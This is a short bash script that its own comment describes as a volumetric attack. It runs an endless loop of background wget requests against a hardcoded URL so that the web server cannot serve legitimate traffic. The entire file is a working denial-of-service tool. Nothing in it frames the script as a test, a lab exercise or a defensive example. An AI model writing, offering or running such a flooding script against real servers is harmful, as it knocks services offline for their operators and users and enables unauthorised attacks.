#!/bin/bash

# This is a volumetric attack, it will send so many requests to the webserver
# that it wont be able to process legitimate requests

# Enable Job Control
set -m

url="http://ksm.dev/hookie"

while [ true ]; do  wget "${url}" -q -O /dev/null & done;
